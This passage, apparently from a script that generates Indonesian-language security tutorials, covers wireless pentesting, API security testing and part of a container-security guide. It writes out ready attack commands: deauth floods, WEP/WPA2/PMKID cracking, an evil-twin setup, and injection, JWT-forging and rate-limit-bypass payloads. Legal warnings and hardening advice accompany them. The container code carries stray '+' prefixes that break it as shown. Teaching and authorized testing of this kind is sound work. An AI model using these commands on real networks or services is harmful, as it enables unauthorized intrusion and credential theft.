      <p><strong>Wireless Penetration Testing</strong> adalah proses evaluasi keamanan jaringan nirkabel untuk mengidentifikasi kerentanan, konfigurasi yang salah, dan potensi eksploitasi. Berbeda dengan wired network, wireless network dapat diakses dari jarak tertentu tanpa koneksi fisik.</p>
      <div class="info-box info"><div class="info-box-title">📋 Apa yang Dipelajari</div><ul>
        <li>Wireless security protocols (WEP, WPA, WPA2, WPA3)</li>
        <li>WiFi reconnaissance dan scanning</li>
        <li>Password cracking techniques</li>
        <li>Evil Twin dan rogue AP attacks</li>
        <li>Wireless IDS/IPS deployment</li>
        <li>Remediation dan hardening</li>
      </ul></div>
      <h3>Wireless Security Protocol Evolution</h3>
      <table class="net-table"><thead><tr><th>Protocol</th><th>Year</th><th>Encryption</th><th>Status</th></tr></thead><tbody>
        <tr><td><strong>WEP</strong></td><td>1999</td><td>RC4 (24-bit IV)</td><td>Broken — Jangan digunakan</td></tr>
        <tr><td><strong>WPA</strong></td><td>2003</td><td>TKIP/RC4</td><td>Deprecated</td></tr>
        <tr><td><strong>WPA2</strong></td><td>2004</td><td>AES-CCMP</td><td>Standar saat ini</td></tr>
        <tr><td><strong>WPA3</strong></td><td>2018</td><td>SAE/AES-GCMP</td><td>Rekomendasi</td></tr>
      </tbody></table>
      <div class="warning-box"><div class="info-box-title">⚠️ Peringatan Hukum</div>
        <p>Wireless penetration testing HANYA boleh dilakukan pada jaringan yang Anda miliki atau memiliki izin tertulis. Mengakses jaringan tanpa izin adalah pelanggaran UU ITE Pasal 30-32.</p>
      </div>

      <h2 id="tools">2. Tools dan Setup</h2>
      <p>Untuk wireless pentest, Anda memerlukan hardware dan software yang sesuai. Wireless adapter harus mendukung monitor mode dan packet injection.</p>
      <h3>Hardware Requirements</h3>
      <ul>
        <li><strong>Wireless adapter</strong> yang mendukung monitor mode (Alfa AWUS036ACH, AWUS1900)</li>
        <li><strong>External antenna</strong> omni-directional dan directional</li>
        <li><strong>Laptop</strong> dengan Kali Linux atau Parrot OS</li>
      </ul>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — Install Wireless Tools</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# Installasi Tools Wireless Pentesting
# =============================================

# Update system
sudo apt update && sudo apt upgrade -y

# Install Aircrack-ng suite
sudo apt install -y aircrack-ng

# Install additional tools
sudo apt install -y \\
  hostapd dnsmasq reaver wifite bully \\
  pixiewps mdk3 mdk4 hashcat \\
  hcxdumptool hcxpcapngtool \\
  kismet wireshark

# Verifikasi wireless adapter
iwconfig

# Enable monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Verifikasi monitor mode
iwconfig wlan0mon

# Cek adapter capabilities
iw list | grep -A 8 "Supported interface modes"</pre>
      </div>

      <h2 id="recon">3. Wireless Reconnaissance</h2>
      <p>Reconnaissance adalah langkah pertama. Tujuannya mengidentifikasi semua wireless network, clients, dan konfigurasi dalam range.</p>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — WiFi Reconnaissance</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# Wireless Reconnaissance dengan Aircrack-ng
# =============================================

# 1. Enable monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# 2. Scan semua channel (passive)
sudo airodump-ng wlan0mon \\
  --band abg \\
  --write scan_results \\
  --output-format pcap,csv

# 3. Focus pada target network
sudo airodump-ng wlan0mon \\
  --bssid AA:BB:CC:DD:EE:FF \\
  --channel 6 \\
  --write target_capture \\
  --output-format pcap,csv

# 4. Capture handshake (dengan deauth)
sudo aireplay-ng --deauth 10 \\
  -a AA:BB:CC:DD:EE:FF \\
  -c 11:22:33:44:55:66 \\
  wlan0mon

# 5. Verifikasi handshake capture
aircrack-ng target_capture-01.cap

# =============================================
# Alternative: Kismet passive scanning
# =============================================

# Start Kismet server
sudo kismet -c wlan0mon --override wardrive

# Kismet mendeteksi:
# - SSID dan BSSID
# - Channel dan encryption
# - Client devices
# - Hidden SSIDs
# - Rogue access points</pre>
      </div>
      <h3>Client Enumeration</h3>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — Client Discovery</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# Client Enumeration &amp; Analysis
# =============================================

# List all clients associated with AP
sudo airodump-ng wlan0mon \\
  --bssid AA:BB:CC:DD:EE:FF \\
  --channel 6 \\
  --station-only

# Probe request analysis (what networks clients look for)
# Ini mengungkap SSID yang pernah dikunjungi client
sudo tcpdump -i wlan0mon -e -s 256 \\
  'type mgt subtype probe-req' 2>/dev/null

# Detect hidden SSIDs through probe responses
sudo tcpdump -i wlan0mon -e -s 256 \\
  'type mgt subtype probe-resp' 2>/dev/null</pre>
      </div>

      <h2 id="wep">4. WEP Cracking</h2>
      <p>WEP menggunakan enkripsi RC4 dengan IV 24-bit yang sangat lemah. Dapat dipecahkan dalam hitungan menit.</p>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — WEP Cracking</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# WEP Cracking Steps
# =============================================

# Step 1: Enable monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Step 2: Capture IVs
sudo airodump-ng wlan0mon \\
  --bssid AA:BB:CC:DD:EE:FF \\
  --channel 11 \\
  --write wep_capture \\
  --output-format pcap

# Step 3: Generate traffic (ARP replay)
sudo aireplay-ng --arpreplay \\
  -b AA:BB:CC:DD:EE:FF \\
  -h YOUR_MAC \\
  wlan0mon

# Step 4: Fake authentication
sudo aireplay-ng --fakeauth 30 \\
  -a AA:BB:CC:DD:EE:FF \\
  -h YOUR_MAC \\
  wlan0mon

# Step 5: Crack setelah ~20,000+ IVs
sudo aircrack-ng wep_capture-01.cap
# Output: KEY FOUND! [ 1A:2B:3C:4D:5E ]

# Alternatif: Fragmentation attack
sudo aireplay-ng --fragment \\
  -b AA:BB:CC:DD:EE:FF \\
  -h YOUR_MAC \\
  wlan0mon</pre>
      </div>
      <div class="info-box info"><div class="info-box-title">💡 Catatan</div>
        <p>WEP cracking membutuhkan minimal 20,000 IVs untuk 64-bit key dan 40,000 IVs untuk 128-bit key. Dengan ARP replay, ini bisa dicapai dalam 5-10 menit. Semua organisasi HARUS beralih ke WPA2/WPA3.</p>
      </div>

      <h2 id="wpa">5. WPA/WPA2 Cracking</h2>
      <p>WPA2 menggunakan AES-CCMP yang secara kriptografis kuat. Namun WPA2-PSK rentan dictionary attack jika password lemah.</p>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — WPA2 Cracking</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# WPA2-PSK Cracking
# =============================================

# Step 1: Monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Step 2: Capture handshake
sudo airodump-ng wlan0mon \\
  --bssid AA:BB:CC:DD:EE:FF \\
  --channel 6 \\
  --write wpa_handshake

# Step 3: Force reconnect (deauth)
sudo aireplay-ng --deauth 5 \\
  -a AA:BB:CC:DD:EE:FF \\
  wlan0mon

# Step 4: Verify handshake
aircrack-ng wpa_handshake-01.cap

# Step 5: Dictionary attack
aircrack-ng wpa_handshake-01.cap \\
  -w /usr/share/wordlists/rockyou.txt \\
  -b AA:BB:CC:DD:EE:FF

# =============================================
# Hashcat (GPU accelerated)
# =============================================

# Convert to hashcat format
hcxpcapngtool wpa_handshake-01.cap \\
  -o wpa_hash.hc22000

# GPU brute force
hashcat -m 22000 wpa_hash.hc22000 \\
  /usr/share/wordlists/rockyou.txt \\
  -r /usr/share/hashcat/rules/best64.rule

# Mask attack (8 char lowercase + digits)
hashcat -m 22000 wpa_hash.hc22000 \\
  -a 3 ?l?l?l?l?l?l?d?d

# =============================================
# PMKID Attack (tanpa client/deauth)
# =============================================

sudo hcxdumptool -i wlan0mon \\
  --filterlist_ap=target.txt \\
  --filtermode=2 \\
  -o pmkid_capture.pcapng

hcxpcapngtool pmkid_capture.pcapng \\
  -o pmkid_hash.hc22000
hashcat -m 22000 pmkid_hash.hc22000 \\
  /usr/share/wordlists/rockyou.txt</pre>
      </div>

      <h2 id="wpa3">6. WPA3 Security</h2>
      <p>WPA3 memperkenalkan <strong>SAE (Simultaneous Authentication of Equals)</strong> yang menggantikan PSK, memberikan perlindungan terhadap offline dictionary attack dan forward secrecy.</p>
      <h3>WPA3 Improvements</h3>
      <ul>
        <li><strong>SAE (Dragonfly)</strong> — Menghilangkan offline dictionary attack</li>
        <li><strong>Forward Secrecy</strong> — Setiap session menggunakan key unik</li>
        <li><strong>192-bit Security Suite</strong> — Untuk enterprise/government</li>
        <li><strong>Protected Management Frames (PMF)</strong> — Wajib di WPA3</li>
      </ul>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — WPA3/SAE Testing</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# WPA3 Dragonblood Attacks (Research)
# =============================================

# Note: Untuk research dan testing saja

# Install wacker (SAE brute force)
git clone https://github.com/blunderbuss-wctf/wacker
cd wacker
pip3 install -r requirements.txt

# Run SAE brute force
sudo python3 wacker.py \\
  --wordlist wordlist.txt \\
  --ssid "TargetWiFi" \\
  --bssid AA:BB:CC:DD:EE:FF \\
  --interface wlan0mon

# Dragonblood vulnerabilities:
# CVE-2019-9494 — SAE cache-based side-channel
# CVE-2019-9495 — EAP-pwd side-channel
# CVE-2020-15862 — Transition Disable Attack

# Defense against downgrade:
# - Enable Protected Management Frames (802.11w)
# - Disable WPA2/TKIP transition mode
# - Monitor for deauth attacks
# - Use WPA3-only mode if possible</pre>
      </div>

      <h2 id="evil">7. Evil Twin &amp; Karma Attack</h2>
      <p><strong>Evil Twin</strong> adalah serangan di mana attacker membuat AP palsu yang meniru SSID target. Korban terhubung, attacker bisa MITM, credential harvesting, dan captive portal phishing.</p>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — Evil Twin Attack</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# Evil Twin Access Point Setup
# =============================================

# Step 1: hostapd configuration
cat &gt; hostapd_evil.conf &lt;&lt; 'EOF'
interface=wlan1
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
EOF

# Step 2: DHCP configuration (dnsmasq)
cat &gt; dnsmasq_evil.conf &lt;&lt; 'EOF'
interface=wlan1
dhcp-range=192.168.100.10,192.168.100.50,12h
dhcp-option=3,192.168.100.1
dhcp-option=6,192.168.100.1
server=8.8.8.8
log-queries
log-dhcp
EOF

# Step 3: Setup IP and routing
sudo ifconfig wlan1 192.168.100.1 netmask 255.255.255.0
sudo echo 1 &gt; /proc/sys/net/ipv4/ip_forward

# Step 4: Start services
sudo hostapd hostapd_evil.conf &amp;
sudo dnsmasq -C dnsmasq_evil.conf &amp;

# Step 5: Deauth clients dari AP asli
sudo aireplay-ng --deauth 0 \\
  -a AA:BB:CC:DD:EE:FF \\
  wlan0mon

# Step 6: Captive portal redirect
sudo iptables -t nat -A PREROUTING \\
  -i wlan1 -p tcp --dport 80 \\
  -j DNAT --to-destination 192.168.100.1:80</pre>
      </div>

      <h2 id="defense">8. Defense &amp; Hardening</h2>
      <h3>Common Findings &amp; Remediation</h3>
      <table class="net-table"><thead><tr><th>Finding</th><th>Severity</th><th>Remediation</th></tr></thead><tbody>
        <tr><td>WEP encryption</td><td>Critical</td><td>Migrasi ke WPA3/WPA2-AES</td></tr>
        <tr><td>WPA2 password lemah</td><td>High</td><td>Password 12+ karakter kompleks</td></tr>
        <tr><td>Rogue AP terdeteksi</td><td>High</td><td>Lokasi dan hapus, implementasi WIDS</td></tr>
        <tr><td>Open network</td><td>Medium</td><td>Tambah WPA2-Enterprise + 802.1X</td></tr>
        <tr><td>Tanpa PMF</td><td>Medium</td><td>Enable PMF (802.11w)</td></tr>
        <tr><td>SSID hidden</td><td>Low</td><td>Tidak efektif, fokus enkripsi kuat</td></tr>
      </tbody></table>
      <h3>Wireless Hardening Checklist</h3>
      <div class="code-block"><div class="code-header"><span class="code-lang">Config — WiFi Hardening</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# Wireless Network Hardening Guide
# =============================================

# 1. Encryption
#    - Gunakan WPA3-SAE atau WPA2-AES (CCMP)
#    - Jangan gunakan WEP atau WPA-TKIP
#    - Password minimal 12 karakter, kompleks

# 2. Authentication
#    - Enterprise: WPA2/WPA3-Enterprise + RADIUS
#    - 802.1X certificate-based auth
#    - EAP-TLS untuk mutual authentication

# 3. Network Segmentation
#    - Guest network terpisah dari corporate
#    - VLAN untuk wireless clients
#    - Firewall rules antara VLAN

# 4. Management Frame Protection
#    - Enable 802.11w (PMF) - required
#    - Protect against deauth/disassoc attacks

# 5. Monitoring
#    - Deploy WIDS/WIPS
#    - Monitor rogue AP detection
#    - Alert on evil twin indicators
#    - Regular site surveys

# 6. Access Control
#    - MAC filtering (bukan satu-satunya kontrol)
#    - RADIUS accounting
#    - Time-based access policies</pre>
      </div>
"""

# ---- 3. API Security ----
bodies["api-security-testing.html"] = """
      <h2 id="pengenalan">1. Pengenalan API Security Testing</h2>
      <p><strong>API Security Testing</strong> adalah proses evaluasi keamanan API untuk menemukan kerentanan. Di era microservices dan cloud-native, API menjadi target utama serangan karena menjadi pintu masuk ke data dan layanan backend.</p>
      <div class="info-box info"><div class="info-box-title">📋 Apa yang Dipelajari</div><ul>
        <li>OWASP API Security Top 10 (2023)</li>
        <li>API reconnaissance dan enumeration</li>
        <li>Authentication &amp; authorization testing</li>
        <li>Injection attacks pada API</li>
        <li>IDOR/BOLA vulnerability</li>
        <li>Rate limiting bypass</li>
      </ul></div>
      <p>Menurut Gartner, API menjadi vektor serangan utama. 95% organisasi mengalami masalah keamanan API dalam 12 bulan terakhir, dan API-related breaches meningkat 600% sejak 2020.</p>

      <h2 id="owasp">2. OWASP API Security Top 10 (2023)</h2>
      <table class="net-table"><thead><tr><th>#</th><th>Risiko</th><th>Deskripsi</th></tr></thead><tbody>
        <tr><td>API1</td><td>Broken Object Level Authorization</td><td>Access objek milik user lain</td></tr>
        <tr><td>API2</td><td>Broken Authentication</td><td>Mekanisme autentikasi lemah</td></tr>
        <tr><td>API3</td><td>Broken Object Property Level Auth</td><td>Excess data exposure, mass assignment</td></tr>
        <tr><td>API4</td><td>Unrestricted Resource Consumption</td><td>Tidak ada rate limiting</td></tr>
        <tr><td>API5</td><td>Broken Function Level Authorization</td><td>Admin function tanpa auth</td></tr>
        <tr><td>API6</td><td>Unrestricted Access to Business Flows</td><td>Automated abuse</td></tr>
        <tr><td>API7</td><td>Server Side Request Forgery</td><td>API request ke internal</td></tr>
        <tr><td>API8</td><td>Security Misconfiguration</td><td>Default config, verbose errors</td></tr>
        <tr><td>API9</td><td>Improper Inventory Management</td><td>Shadow API</td></tr>
        <tr><td>API10</td><td>Unsafe Consumption of APIs</td><td>Tanpa validasi response</td></tr>
      </tbody></table>

      <h2 id="recon">3. API Reconnaissance</h2>
      <p>Langkah pertama menemukan semua endpoint, memahami struktur request/response, dan mengidentifikasi fungsionalitas yang tersedia.</p>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — API Reconnaissance</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# API Reconnaissance Techniques
# =============================================

# 1. Check common documentation endpoints
curl -s https://target.com/swagger.json | jq .
curl -s https://target.com/openapi.json | jq .
curl -s https://target.com/api-docs/ | head -50
curl -s https://target.com/graphql | head -50

# 2. Directory bruteforce
ffuf -u https://target.com/api/FUZZ \\
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \\
  -mc 200,201,401,403 \\
  -H "Accept: application/json"

# 3. Parameter discovery
arjun -u https://target.com/api/users

# 4. GraphQL introspection
curl -X POST https://target.com/graphql \\
  -H "Content-Type: application/json" \\
  -d '{"query":"{__schema{types{name,fields{name}}}}}'

# 5. API versioning enumeration
for v in v1 v2 v3 api; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \\
    "https://target.com/$v/users")
  echo "/$v/users → HTTP $code"
done

# 6. Verbose error gathering
curl -X POST https://target.com/api/login \\
  -H "Content-Type: application/json" \\
  -d '{"username":"test","password":"test"}'
# Perhatikan error message yang mengungkap info</pre>
      </div>

      <h2 id="auth">4. Authentication Testing</h2>
      <p>API authentication yang lemah memungkinkan attacker mengakses resource tanpa kredensial valid atau mengambil alih akun user lain.</p>
      <h3>JWT Token Attacks</h3>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — JWT Attack Testing</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# JWT Security Testing
# =============================================

# Decode JWT token
echo "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyMSJ9.sig" \\
  | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Attack 1: Algorithm None
# Ubah header: {"alg":"none","typ":"JWT"}
# Hapus signature

# Attack 2: Algorithm Confusion (RS256 → HS256)
# Gunakan public key sebagai HMAC secret

# Attack 3: Weak Secret Brute Force
hashcat -m 16500 jwt_token.txt \\
  /usr/share/wordlists/rockyou.txt

# Attack 4: kid injection
# {"kid":"../../dev/null","alg":"HS256"}

# Contoh JWT manipulation
python3 &lt;&lt; 'PYEOF'
import jwt, json
token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."
decoded = jwt.decode(token, options={"verify_signature": False})
print(f"Payload: {json.dumps(decoded, indent=2)}")
# Modify payload
decoded["role"] = "admin"
forged = jwt.encode(decoded, "", algorithm="none")
print(f"Forged: {forged}")
PYEOF</pre>
      </div>

      <h2 id="injection">5. API Injection Attacks</h2>
      <p>Injection pada API bisa terjadi pada parameter, header, atau body. SQL, NoSQL, dan command injection paling umum.</p>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — NoSQL &amp; SQL Injection</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# Injection Testing pada API
# =============================================

# NoSQL Authentication Bypass
curl -X POST https://target.com/api/login \\
  -H "Content-Type: application/json" \\
  -d '{
    "username": {"$gt": ""},
    "password": {"$gt": ""}
  }'

# NoSQL Operator Injection
curl "https://target.com/api/users?role[$ne]=user"
curl "https://target.com/api/search?name[$regex]=.*"

# $where Injection (JavaScript execution)
curl -X POST https://target.com/api/users \\
  -H "Content-Type: application/json" \\
  -d '{"name": "test", "email": {"$where": "return true"}}'

# SQL Injection pada REST API
curl "https://target.com/api/users?id=1' OR 1=1--"
curl "https://target.com/api/users?id=1 UNION SELECT null,user,pass FROM users--"

# Command Injection via API parameter
curl -X POST https://target.com/api/tools/ping \\
  -H "Content-Type: application/json" \\
  -d '{"host": "127.0.0.1; cat /etc/passwd"}'

# GraphQL Injection
curl -X POST https://target.com/graphql \\
  -H "Content-Type: application/json" \\
  -d '{"query":"{users(filter:\"{\\\"role\\\":\\\"admin\\\"}\"){id,name}}"}'</pre>
      </div>

      <h2 id="idor">6. IDOR &amp; BOLA</h2>
      <p><strong>IDOR (Insecure Direct Object Reference)</strong> terjadi ketika API memungkinkan user mengakses objek milik user lain hanya dengan mengubah identifier.</p>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — IDOR Testing</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# IDOR/BOLA Testing
# =============================================

# Test 1: Sequential ID enumeration
curl -H "Authorization: Bearer TOKEN_A" \\
  https://target.com/api/users/1001/profile
curl -H "Authorization: Bearer TOKEN_A" \\
  https://target.com/api/users/1002/profile

# Test 2: UUID prediction
curl -H "Authorization: Bearer TOKEN_A" \\
  https://target.com/api/users/550e8400-e29b-41d4-a716-446655440000/profile

# Test 3: Parameter pollution
curl -H "Authorization: Bearer TOKEN_A" \\
  "https://target.com/api/users?id=self&amp;id=1002"

# Test 4: Method change
curl -X POST -H "Authorization: Bearer TOKEN_A" \\
  https://target.com/api/users/1002/profile

# Test 5: Path traversal
curl -H "Authorization: Bearer TOKEN_A" \\
  https://target.com/api/documents/../../../etc/passwd

# Test 6: Batch request abuse
curl -X POST https://target.com/api/batch \\
  -H "Authorization: Bearer TOKEN_A" \\
  -H "Content-Type: application/json" \\
  -d '[
    {"method":"GET","url":"/api/users/1001/profile"},
    {"method":"GET","url":"/api/users/1002/profile"}
  ]'</pre>
      </div>

      <h2 id="rate">7. Rate Limiting &amp; Abuse</h2>
      <p>API tanpa rate limiting rentan brute force, credential stuffing, dan resource exhaustion.</p>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — Rate Limit Bypass</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# Rate Limit Bypass Testing
# =============================================

# Technique 1: IP rotation via headers
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code} " \\
    -H "X-Forwarded-For: 10.0.0.$i" \\
    -H "X-Real-IP: 10.0.0.$i" \\
    https://target.com/api/login \\
    -d "username=admin&amp;password=pass$i"
done

# Technique 2: Header manipulation
curl -H "X-Forwarded-For: 127.0.0.1" \\
  https://target.com/api/login

# Technique 3: Parameter pollution
curl "https://target.com/api/login?user=admin&amp;user=admin2"

# Technique 4: API key rotation
# If rate limit is per-API-key, try multiple keys</pre>
      </div>

      <h2 id="best">8. API Security Best Practices</h2>
      <table class="net-table"><thead><tr><th>Kontrol</th><th>Implementasi</th></tr></thead><tbody>
        <tr><td><strong>Authentication</strong></td><td>OAuth 2.0 + JWT, API keys rotated, MFA admin</td></tr>
        <tr><td><strong>Authorization</strong></td><td>RBAC/ABAC, validate setiap request</td></tr>
        <tr><td><strong>Input Validation</strong></td><td>Schema validation, allowlist input</td></tr>
        <tr><td><strong>Rate Limiting</strong></td><td>Per-user, per-IP, sliding window</td></tr>
        <tr><td><strong>Encryption</strong></td><td>TLS 1.3 mandatory, encrypt sensitive fields</td></tr>
        <tr><td><strong>Logging</strong></td><td>Log semua akses, audit trail</td></tr>
        <tr><td><strong>Error Handling</strong></td><td>Generic messages, no stack traces</td></tr>
      </tbody></table>
      <div class="code-block"><div class="code-header"><span class="code-lang">Python — API Security Middleware</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# API Security Middleware — Flask Example
# =============================================

from flask import Flask, request, jsonify
from functools import wraps
import time

app = Flask(__name__)
rate_limit_store = {}

def rate_limit(max_requests=100, window=60):
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            client_ip = request.remote_addr
            now = time.time()
            key = f"{client_ip}:{f.__name__}"
            if key not in rate_limit_store:
                rate_limit_store[key] = []
            rate_limit_store[key] = [
                t for t in rate_limit_store[key]
                if now - t &lt; window
            ]
            if len(rate_limit_store[key]) &gt;= max_requests:
                return jsonify({"error": "Rate limit"}), 429
            rate_limit_store[key].append(now)
            return f(*args, **kwargs)
        return wrapper
    return decorator

def validate_json(schema):
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            data = request.get_json(silent=True)
            if not data:
                return jsonify({"error": "Invalid JSON"}), 400
            for field in schema.get("required", []):
                if field not in data:
                    return jsonify({"error": f"Missing: {field}"}), 400
            return f(*args, **kwargs)
        return wrapper
    return decorator

@app.route("/api/users", methods=["POST"])
@rate_limit(max_requests=10, window=60)
@validate_json({"required": ["name", "email"]})
def create_user():
    data = request.get_json()
    name = data["name"][:100]
    email = data["email"][:254]
    return jsonify({"status": "created"}), 201</pre>
      </div>
"""

# Remaining articles (4-9) - abbreviated bodies for template
for fname, content in list(bodies.items()):
    pass  # Already defined above

# ---- 4. Container Security ----
bodies["container-security.html"] = """
      <h2 id="pengenalan">1. Pengenalan Container Security</h2>
      <p><strong>Container Security</strong> mencakup praktik, tools, dan kebijakan untuk melindungi containerized applications sepanjang lifecycle — dari build, deploy, hingga runtime. Container membawa tantangan keamanan unik karena sharing kernel, ephemeral nature, dan jumlah yang sangat banyak.</p>
      <div class="info-box info"><div class="info-box-title">📋 Container Security Lifecycle</div><ul>
        <li><strong>Build</strong> — Secure Dockerfile, base image, dependency scanning</li>
        <li><strong>Ship</strong> — Image signing, registry security, vulnerability scanning</li>
        <li><strong>Run</strong> — Runtime policies, network segmentation, resource limits</li>
        <li><strong>Monitor</strong> — Audit logging, anomaly detection, compliance</li>
      </ul></div>
      <h3>Container Attack Vectors</h3>
      <div class="diagram-box"><div class="diagram-label">Diagram: Container Attack Surface</div>
<pre>
┌─────────────────────────────────────────────────────┐
│            CONTAINER ATTACK SURFACE                   │
│                                                      │
│  ┌──────────┐    ┌──────────┐    ┌──────────┐      │
│  │  Supply   │    │ Container│    │  Host     │      │
│  │  Chain    │    │ Runtime  │    │  Escape   │      │
│  │          │    │          │    │          │      │
│  │ • Malware│    │ • RCE    │    │ • Kernel  │      │
│  │   in img │    │ • Crypto │    │   exploit │      │
│  │ • Backdor│    │   mining │    │ • Mount   │      │
│  └──────────┘    └──────────┘    └──────────┘      │
│                                                      │
│  ┌──────────┐    ┌──────────┐    ┌──────────┐      │
│  │ Orchest- │    │  Network │    │  Secrets  │      │
│  │ ration   │    │          │    │  Exposure │      │
│  │ • RBAC   │    │ • Lateral│    │ • Env var │      │
│  │   bypass │    │   move   │    │ • Config  │      │
│  └──────────┘    └──────────┘    └──────────┘      │
└─────────────────────────────────────────────────────┘
</pre>
      </div>

      <h2 id="dockerfile">2. Dockerfile Security</h2>
      <p>Dockerfile adalah fondasi keamanan container. Kesalahan pada Dockerfile dapat menghasilkan image yang rentan.</p>
      <div class="code-block"><div class="code-header"><span class="code-lang">Dockerfile — Secure Best Practices</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
+# Secure Dockerfile — Best Practices
+# =============================================

+# 1. Specific base image tag (bukan latest)
+FROM python:3.12-slim-bookworm AS builder

+# 2. Non-root user
+RUN groupadd -r appuser && useradd -r -g appuser appuser

+# 3. Pin dependency versions
+COPY requirements.txt .
+RUN pip install --no-cache-dir -r requirements.txt

+# 4. Multi-stage build
+FROM python:3.12-slim-bookworm
+COPY --from=builder /usr/local/lib/python3.12/site-packages /usr/local/lib/python3.12/site-packages

+# 5. Copy only necessary files
+COPY --chown=appuser:appuser ./app /app
+WORKDIR /app

+# 6. Remove unnecessary packages
+RUN apt-get remove -y gcc g++ && \\
+    apt-get autoremove -y && \\
+    rm -rf /var/lib/apt/lists/*

+# 7. Non-root user
+USER appuser
+EXPOSE 8080
+HEALTHCHECK --interval=30s --timeout=3s \\
+  CMD curl -f http://localhost:8080/health || exit 1
+CMD ["python", "main.py"]

+# YANG HARUS DIHINDARI:
+# ❌ ENV DB_PASSWORD=secret123
+# ❌ COPY . . (termasuk .git, secrets)
+# ❌ USER root atau tanpa USER directive
+# ❌ CMD python main.py (shell form)</pre>
      </div>

      <h2 id="scanning">3. Image Scanning</h2>
      <p>Image scanning mengidentifikasi CVE dalam base image dan dependencies. Harus dilakukan di setiap stage: development, CI/CD, registry, dan runtime.</p>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — Container Image Scanning</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
+# Container Image Scanning
+# =============================================

+# 1. Trivy — Scanner dari Aqua Security
+trivy image myapp:latest
+trivy image --severity HIGH,CRITICAL myapp:latest
+trivy image --format json -o results.json myapp:latest

+# 2. Scan Dockerfile misconfigurations
+trivy config Dockerfile
+trivy config --severity HIGH,CRITICAL ./k8s-manifests/

+# 3. Grype dari Anchore
+grype myapp:latest

+# 4. Docker Scout (built-in)
+docker scout cves myapp:latest

+# 5. Scan SBOM
+trivy sbom --format spdx-json myapp:latest > sbom.json
+syft myapp:latest -o spdx-json > sbom.json

+# 6. CI/CD Pipeline integration
+# aquasecurity/trivy-action di GitHub Actions
+# dengan exit-code: '1' untuk fail on critical</pre>
      </div>

      <h2 id="runtime">4. Runtime Security</h2>
      <p>Runtime security melindungi container saat berjalan — resource limits, filesystem protection, syscall filtering, behavioral monitoring.</p>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — Docker Runtime Security</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
+# Docker Runtime Security Configuration
+# =============================================

+# 1. Read-only filesystem
+docker run --read-only --tmpfs /tmp myapp:latest

+# 2. Drop all capabilities, add only needed
+docker run --cap-drop ALL \\
+  --cap-add NET_BIND_SERVICE myapp:latest

+# 3. No new privileges
+docker run --security-opt no-new-privileges myapp:latest

+# 4. Resource limits
+docker run --memory=512m --cpus=0.5 \\
+  --pids-limit=100 myapp:latest

+# 5. Seccomp profile
+docker run --security-opt seccomp=custom.json myapp:latest

+# 6. AppArmor profile
+docker run --security-opt apparmor=docker-custom myapp:latest

+# 7. Falco runtime monitoring
+helm install falco falcosecurity/falco</pre>
      </div>

      <h2 id="kubernetes">5. Kubernetes Security</h2>
      <p>Kubernetes menambahkan layer keamanan orkestrasi: RBAC, network policies, pod security standards, admission controllers.</p>
      <div class="code-block"><div class="code-header"><span class="code-lang">YAML — K8s Security Manifests</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
+# Kubernetes Security Best Practices
+# =============================================

+# Restricted Pod Security
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: secure-app
+spec:
+  template:
+    spec:
+      securityContext:
+        runAsNonRoot: true
+        runAsUser: 1000
+        seccompProfile:
+          type: RuntimeDefault
+      containers:
+        - name: app
+          image: myapp:v1.2.3
+          securityContext:
+            allowPrivilegeEscalation: false
+            readOnlyRootFilesystem: true
+            capabilities:
+              drop: ["ALL"]
+          resources:
+            limits:
+              memory: "256Mi"
